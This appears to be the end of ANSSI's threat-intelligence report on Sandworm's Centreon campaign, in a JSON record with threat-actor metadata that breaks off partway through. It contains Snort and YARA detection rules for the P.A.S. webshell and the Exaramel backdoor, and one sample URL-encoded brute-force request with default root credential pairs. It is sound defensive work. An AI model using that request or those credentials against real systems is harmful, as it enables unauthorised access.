protocol[]=protocol|Where the protocol might be: h (SSH) f (FTP) m (Mail) y (MySQL) s (MsSQL) p (PostgreSQL)|\n|h[X]=val|attack target host[protocol]=target|Where the protocol is chosen within the following list and the target is ei- ther a domain or an IP address.|\n|p[X]=val|port[protocol]=targeted port|Where the protocol is chosen within the following list or the port is a nu- merical value.|\n|el|user/password couple root:root|on|\n|ep|user/password couple root:ftproot|on|\n|er|user/password couple root:toor|on|\n|es|user/password couple root:rootftp|on|\n\n```\nbr=&brp%5B%5D=f&h%5Bf%5D=localhost&p%5Bf%5D=21&h%5Bm%5D=localhost&p%5Bm%5D=110&el=on&er=on&bg=%3E\n\n```\n\nThe following Snort rule allows to detect traffic related to these parameters.\n\n1 `alert tcp any any -> any any ( sid:2000210015; msg:\"P.A.S. webshell - passwd BruteForce form`\n_�→_ `parameters\"; \\`\n\n2 `flow:to_server,established;` `content:\"POST\"; http_method; \\`\n\n3 `content:\"br=&brp%5B%5D=\"; http_client_body; fast_pattern; \\`\n\n4 `pcre:\"/br=&brp%5B%5D=[hfmysp]&h%5B[hfmysp]%5D=.{1,64}&p%5B[hfmysp]%5D=[0-9]{1,5}/\";`\n_�→_ `http_client_body;)`\n\n###### 7.1.2.3 Handshake for remote command shell\n\nAs seen above, both remote shells, either Bind or Reverse, have a specific chain of characters that can be detected\nby the following Snort rule.\n\n1 `alert tcp any any -> any any ( sid:2000210016; msg:\"P.A.S. webshell - Bind shell session\"; \\`\n\n2 `content:\"Hello from P.A.S. Bind Port\"; )`\n\n3\n\n4 `alert tcp any any -> any any ( sid:2000210017; msg:\"P.A.S. webshell - Reverse shell session\";`\n_�→_ `\\`\n\n5 `content:\"Hello from P.A.S. BackConnect\"; )`\n\n###### 7.1.2.4 Webshell page content\n\nIn addition to the various requests to the webshell, the webpage content itself can be detected.\n\nA fragment that can be used is the HTML available in the footer of the page as follows:\n\n27/01/2021 Page 30 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n- the network traffic should be the answer to a POST request with a 200 status code;\n\n- transfered content should be encoded using GZIP;\n\n- the uncompressed content should contain the following HTML snippet:\n\n```\n<fieldset class=\"footer\"><table width=\"100%\" border=\"0\"><tr><td>P.A.S. v\n\n```\n\nThe following Snort rule follows this method.\n\n1 `alert tcp any any -> any any ( sid:2000210000; msg:\"P.A.S. webshell - Response Footer\"; \\`\n\n2 `flow:to_client,established; content:\"200\"; http_stat_code; \\`\n\n3 `file_data; content:\"<fieldset class=\\\"footer\\\"><table width=\\\"100%\\\"`\n_�→_ `border=\\\"0\\\"><tr><td>P.A.S. v\";)`\n\n#### 7.2 Exaramel backdoor detection\n\n##### 7.2.1 System artefacts\n\nList of files that might be created by Exaramel:\n\n   - $EXARAMEL_DIR/configtx.json ;\n\n   - $EXARAMEL_DIR/config.json ;\n\n   - $EXARAMEL_DIR/$TASK_ID.rep where $TASK_ID is a number;\n\n    - $EXARAMEL_PATH.old save file created during an update. It is usually wiped at the end of an update;\n\n   - /etc/systemd/system/syslogd.service;\n\n   - /etc/init/syslogd.conf;\n\n   - /etc/init.d/syslogd;\n\n    - /etc/rc.d/syslogger (this file is not directly created by Exaramel but is linked to one of its persistence\nmethod).\n\nList of sockets created by Exaramel:\n\n   - UNIX sockets /tmp/.applocktx and /tmp/.applock\n\n    - TCP socket for HTTPS communication to Command and Control server.\n\n**Exaramel indirectly creates system logs during its persistence setup and deletion. The system logs type depends**\non the persistence method used.\n\n**Exaramel creates shell processes to run OS.ShellExecute tasks. If Task.AnswerWait is equal to 0 for one of these**\ntasks, the process becomes defunct when its execution ends. As a consequence, it is deleted only when the execution\nof the Exaramel process has also ended.\n\n27/01/2021 Page 31 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n##### 7.2.2 YARA rules\n\nThe following YARA rules are proposed to detect Exaramel samples.\n\n1 `/* configuration file */`\n\n2\n\n3 `rule exaramel_configuration_key {`\n\n4\n\n5 `meta:`\n\n6 `author = \"FR/ANSSI/SDO\"`\n\n7 `description = \"Encryption key for the configuration file in sample`\n_�→_ `e1ff72[...]\"`\n\n8 `TLP = \"White\"`\n\n9\n\n10 `strings:`\n\n11 `$ = \"odhyrfjcnfkdtslt\"`\n\n12\n\n13 `condition:`\n\n14 `all of them`\n\n15 `}`\n\n16\n\n17 `rule exaramel_configuration_name_encrypted {`\n\n18\n\n19 `meta:`\n\n20 `author = \"FR/ANSSI/SDO\"`\n\n21 `description = \"Name of the configuration file in sample e1ff72[...]\"`\n\n22 `TLP = \"White\"`\n\n23\n\n24 `strings:`\n\n25 `$ = \"configtx.json\"`\n\n26\n\n27 `condition:`\n\n28 `all of them`\n\n29 `}`\n\n30\n\n31 `rule exaramel_configuration_file_plaintext {`\n\n32\n\n33 `meta:`\n\n34 `author = \"FR/ANSSI/SDO\"`\n\n35 `description = \"Content of the configuration file (plaintext)\"`\n\n36 `TLP = \"White\"`\n\n37\n\n38 `strings:`\n\n39 `$ =`\n_�→_ `/{\"Hosts\":\\[\".{10,512}\"\\],\"Proxy\":\".{0,512}\",\"Version\":\".{1,32}\",\"Guid\":\"/`\n\n40\n\n41 `condition:`\n\n42 `all of them`\n\n43 `}`\n\n44\n\n45 `rule exaramel_configuration_file_ciphertext {`\n\n46\n\n47 `meta:`\n\n48 `author = \"FR/ANSSI/SDO\"`\n\n49 `description = \"Content of the configuration file (encrypted with key`\n_�→_ `odhyrfjcnfkdtslt, sample e1ff72[...]\"`\n\n50 `TLP = \"White\"`\n\n27/01/2021 Page 32 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n51\n\n52 `strings:`\n\n53 `$ = {6F B6 08 E9 A3 0C 8D 5E DD BE D4} // encrypted with key odhyrfjcnfkdtslt`\n\n54\n\n55 `condition:`\n\n56 `all of them`\n\n57 `}`\n\n58\n\n59 `/* persistence */`\n\n60\n\n61 `private rule exaramel_persistence_file_systemd {`\n\n62\n\n63 `meta:`\n\n64 `author = \"FR/ANSSI/SDO\"`\n\n65 `description = \"Beginning of the file /etc/systemd/system/syslogd.service`\n_�→_ `created for persistence with systemd\"`\n\n66 `TLP = \"White\"`\n\n67\n\n68 `strings:`\n\n69 `$ = /\\[Unit\\]\\nDescription=Syslog`\n\n_�→_ `daemon\\n\\n\\[Service\\]\\nWorkingDirectory=.{1,512}\\nExecStartPre=\\/bin\\/rm`\n\n_�→_ `\\-f \\/tmp\\/\\.applocktx\\n/`\n\n\n70\n\n71 `condition:`\n\n72 `all of them`\n\n73 `}`\n\n74\n\n75 `private rule exaramel_persistence_file_upstart {`\n\n76\n\n77 `meta:`\n\n78 `author = \"FR/ANSSI/SDO\"`\n\n79 `description = \"Part of the file /etc/init/syslogd.conf created for`\n_�→_ `persistence with upstart\"`\n\n80 `TLP = \"White\"`\n\n81\n\n82 `strings:`\n\n83 `$ = /start on runlevel \\[2345\\]\\nstop on runlevel`\n_�→_ `\\[06\\]\\n\\nrespawn\\n\\nscript\\nrm \\-f \\/tmp\\/\\.applocktx\\nchdir/`\n\n84\n\n85 `condition:`\n\n86 `all of them`\n\n87 `}`\n\n88\n\n89 `private rule exaramel_persistence_file_systemv {`\n\n90\n\n91 `meta:`\n\n92 `author = \"FR/ANSSI/SDO\"`\n\n93 `description = \"Part of the file /etc/init.d/syslogd created for persistence`\n_�→_ `with upstart\"`\n\n94 `TLP = \"White\"`\n\n95\n\n96 `strings:`\n\n97 `$ = \"# Short-Description: Syslog service for monitoring \\n### END INIT`\n_�→_ `INFO\\n\\nrm -f /tmp/.applocktx && cd \"`\n\n98\n\n99 `condition:`\n\n27/01/2021 Page 33 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n100 `all of them`\n\n101 `}`\n\n102\n\n103 `rule exaramel_persistence_file {`\n\n104\n\n105 `meta:`\n\n106 `author = \"FR/ANSSI/SDO\"`\n\n107 `description = \"File created for persistence. Depends on the environment\"`\n\n108 `TLP = \"White\"`\n\n109\n\n110 `condition:`\n\n111 `exaramel_persistence_file_systemd or exaramel_persistence_file_upstart or`\n_�→_ `exaramel_persistence_file_systemv`\n\n112 `}`\n\n113\n\n114 `/* misc */`\n\n115\n\n116 `rule exaramel_socket_path {`\n\n117\n\n118 `meta:`\n\n119 `author = \"FR/ANSSI/SDO\"`\n\n120 `description = \"Path of the unix socket created to prevent concurrent`\n_�→_ `executions\"`\n\n121 `TLP = \"White\"`\n\n122\n\n123 `strings:`\n\n124 `$ = \"/tmp/.applocktx\"`\n\n125\n\n126 `condition:`\n\n127 `all of them`\n\n128 `}`\n\n129\n\n130 `rule exaramel_task_names {`\n\n131\n\n132 `meta:`\n\n133 `author = \"FR/ANSSI/SDO\"`\n\n134 `description = \"Name of the tasks received by the CC\"`\n\n135 `TLP = \"White\"`\n\n136\n\n137 `strings:`\n\n138 `$ = \"App.Delete\"`\n\n139 `$ = \"App.SetServer\"`\n\n140 `$ = \"App.SetProxy\"`\n\n141 `$ = \"App.SetTimeout\"`\n\n142 `$ = \"App.Update\"`\n\n143 `$ = \"IO.ReadFile\"`\n\n144 `$ = \"IO.WriteFile\"`\n\n145 `$ = \"OS.ShellExecute\"`\n\n146\n\n147 `condition:`\n\n148 `all of them`\n\n149 `}`\n\n150\n\n151 `rule exaramel_struct {`\n\n152\n\n153 `meta:`\n\n27/01/2021 Page 34 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n154 `author = \"FR/ANSSI/SDO\"`\n\n155 `description = \"Beginning of type _type struct for some of the most important`\n_�→_ `structs\"`\n\n156 `TLP = \"White\"`\n\n157\n\n158 `strings:`\n\n159 `$struct_le_config = {70 00 00 00 00 00 00 00 58 00 00 00 00 00 00 00 47 2d 28`\n_�→_ `42 0? [2] 19}`\n\n160 `$struct_le_worker = {30 00 00 00 00 00 00 00 30 00 00 00 00 00 00 00 46 6a 13`\n_�→_ `e2 0? [2] 19}`\n\n161 `$struct_le_client = {20 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 7b 6a 49`\n_�→_ `84 0? [2] 19}`\n\n162 `$struct_le_report = {30 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00 bf 35 0d`\n_�→_ `f9 0? [2] 19}`\n\n163 `$struct_le_task = {50 00 00 00 00 00 00 00 20 00 00 00 00 00 00 00 88 60 a1`\n_�→_ `c5 0? [2] 19}`\n\n164\n\n165 `condition:`\n\n166 `any of them`\n\n167 `}`\n\n168\n\n169 `private rule exaramel_strings_url {`\n\n170\n\n171 `meta:`\n\n172 `author = \"FR/ANSSI/SDO\"`\n\n173 `description = \"Misc strings coming from URL parts\"`\n\n174 `TLP = \"White\"`\n\n175\n\n176 `strings:`\n\n177 `$url1 = \"/tasks.get/\"`\n\n178 `$url2 = \"/time.get/\"`\n\n179 `$url3 = \"/time.set\"`\n\n180 `$url4 = \"/tasks.report\"`\n\n181 `$url5 = \"/attachment.get/\"`\n\n182 `$url6 = \"/auth/app\"`\n\n183\n\n184 `condition:`\n\n185 `5 of ($url*)`\n\n186 `}`\n\n187\n\n188 `private rule exaramel_strings_typo {`\n\n189\n\n190 `meta:`\n\n191 `author = \"FR/ANSSI/SDO\"`\n\n192 `description = \"Misc strings with typo\"`\n\n193 `TLP = \"White\"`\n\n194\n\n195 `strings:`\n\n196 `$typo1 = \"/sbin/init |` `awk \"`\n\n197 `$typo2 = \"Syslog service for monitoring \\n\"`\n\n198 `$typo3 = \"Error.Can't update app! Not enough update archive.\"`\n\n199 `$typo4 = \":\\\"metod\\\"\"`\n\n200\n\n201 `condition:`\n\n202 `3 of ($typo*)`\n\n203 `}`\n\n27/01/2021 Page 35 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n204\n\n205 `private rule exaramel_strings_persistence {`\n\n206\n\n207 `meta:`\n\n208 `author = \"FR/ANSSI/SDO\"`\n\n209 `description = \"Misc strings describing persistence methods\"`\n\n210 `TLP = \"White\"`\n\n211\n\n212 `strings:`\n\n213 `$ = \"systemd\"`\n\n214 `$ = \"upstart\"`\n\n215 `$ = \"systemV\"`\n\n216 `$ = \"freebsd rc\"`\n\n217\n\n218 `condition:`\n\n219 `all of them`\n\n220 `}`\n\n221\n\n222 `private rule exaramel_strings_report {`\n\n223\n\n224 `meta:`\n\n225 `author = \"FR/ANSSI/SDO\"`\n\n226 `description = \"Misc strings coming from report file name\"`\n\n227 `TLP = \"White\"`\n\n228\n\n229 `strings:`\n\n230 `$ = \"systemdupdate.rep\"`\n\n231 `$ = \"upstartupdate.rep\"`\n\n232 `$ = \"remove.rep\"`\n\n233\n\n234 `condition:`\n\n235 `all of them`\n\n236 `}`\n\n237\n\n238 `rule exaramel_strings {`\n\n239\n\n240 `meta:`\n\n241 `author = \"FR/ANSSI/SDO\"`\n\n242 `description = \"Misc strings including URLs, typos, supported startup systems`\n_�→_ `and report file names\"`\n\n243 `TLP = \"White\"`\n\n244\n\n245 `condition:`\n\n246 `exaramel_strings_typo or (exaramel_strings_url and`\n\n_�→_ `exaramel_strings_persistence) or (exaramel_strings_persistence and`\n\n_�→_ `exaramel_strings_report) or (exaramel_strings_url and`\n\n_�→_ `exaramel_strings_report)`\n\n247 `}`\n\n##### 7.2.3 Network detection\n\n**Exaramel uses HTTPS to communicate with its Command and Control server. It uses the standard GO TLS library.**\nNo unusual parameters are used, which does not enable the identification of Exaramel communications.\n\n27/01/2021 Page 36 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n#### 7.3 Indicators of compromise\n\nA MISP event is available with techical elements indicated in this report.\n\n27/01/2021 Page 37 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### 8 Bibliography\n\n[1] ESET. New Telebots Backdoor : First Evidence Linking Industroyer to NotPetya. October 2018.\n[URL: https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-](https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/)\n```\n   notpetya/.\n\n```\n[2] Centreon. Centreon Documentation.\n[URL: https://docs.centreon.com.](https://docs.centreon.com)\n\n[3] Andrew E. Kramer and Andrew Higgins. “In Ukraine, a Malware Expert Who Could Blow the Whistle on\nRussian Hacking”. August 2017.\n[URL: https://www.nytimes.com/2017/08/16/world/europe/russia- ukraine- malware- hacking-](https://www.nytimes.com/2017/08/16/world/europe/russia-ukraine-malware-hacking-witness.html)\n```\n   witness.html.\n\n```\n[4] Petri Krohn. Did a Ukrainian University Student Create Grizzly Steppe? January 2017.\n[URL: https://off- guardian.org/2017/01/09/did- a- ukrainian- university- student- create-](https://off-guardian.org/2017/01/09/did-a-ukrainian-university-student-create-grizzly-steppe/)\n```\n   grizzly-steppe/.\n\n```\n[5] Trustwave - Spiderlabs. Authentication and Encryption in PAS Web Shell Variant.\n[URL: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authentication-and-](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authentication-and-encryption-in-pas-web-shell-variant/)\n```\n   encryption-in-pas-web-shell-variant/.\n\n```\n[6] Wordfence. US Govt Data Shows Russia Used Outdated Ukrainian PHP Malware. December 2016.\n[URL: https://www.wordfence.com/blog/2016/12/russia-malware-ip-hack/.](https://www.wordfence.com/blog/2016/12/russia-malware-ip-hack/)\n\n[7] Yobi Wiki. Forensics on Incident 3. 2014.\n[URL: https://wiki.yobi.be/wiki/Forensics_on_Incident_3.](https://wiki.yobi.be/wiki/Forensics_on_Incident_3)\n\n[8] DHS/CISA US-CERT. Enhanced Analysis of Grizzly Steppe Activity. December 2017.\n[URL: https://us-cert.cisa.gov/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity.](https://us-cert.cisa.gov/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity)\n\n[9] Anton Cherepanov. November 11, 2019.\n[URL: https://twitter.com/cherepanov74/status/1193762686586277889.](https://twitter.com/cherepanov74/status/1193762686586277889)\n\n[10] ANSSI. Recommandations relatives à l’administration sécurisée des systèmes d’information. 2018.\n[URL: https://www.ssi.gouv.fr/administration/guide/securiser-ladministration-des-systemes-](https://www.ssi.gouv.fr/administration/guide/securiser-ladministration-des-systemes-dinformation/)\n```\n   dinformation/.\n\n```\n[11] ANSSI. Recommandations de configuration d’un système GNU/Linux. 2019.\n[URL: https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-un-systeme-](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-un-systeme-gnulinux/)\n```\n   gnulinux/.\n\n```\n[12] DHS/CISA US-CERT. Malware Initial Findings Report (MIFR) - 10105049-Update2. March 2017.\n\n27/01/2021 Page 38 of 38\n\n\n-----\n\n1.0 - 27/01/2021\nOpen License (Étalab - v2.0)\n\n**AGENCE NATIONALE DE LA SÉCURITÉ DES SYSTÈMES D’INFORMATION**\n\nANSSI - 51 boulevard de la Tour-Maubourg, 75700 PARIS 07 SP\nwww.cert.ssi.gouv.fr / cert-fr.cossi@ssi.gouv.fr\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
    ],
    "report_names": [
        "CERTFR-2021-CTI-005.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "39842197-944a-49fd-9bec-eafa1807e0ea",
            "created_at": "2022-10-25T16:07:24.310589Z",
            "updated_at": "2025-03-27T02:02:10.167471Z",
            "deleted_at": null,
            "main_name": "TeleBots",
            "aliases": [],
            "source_name": "ETDA:TeleBots",
            "tools": [
                "BadRabbit",
                "Black Energy",
                "BlackEnergy",
                "CredRaptor",
                "Diskcoder.C",
                "EternalPetya",
                "ExPetr",
                "Exaramel",
                "FakeTC",
                "Felixroot",
                "GreyEnergy",
                "GreyEnergy mini",
                "KillDisk",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "NonPetya",
                "NotPetya",
                "Nyetya",
                "Petna",
                "Petrwrap",
                "Pnyetya",
                "TeleBot",
                "TeleDoor",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "nPetya"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
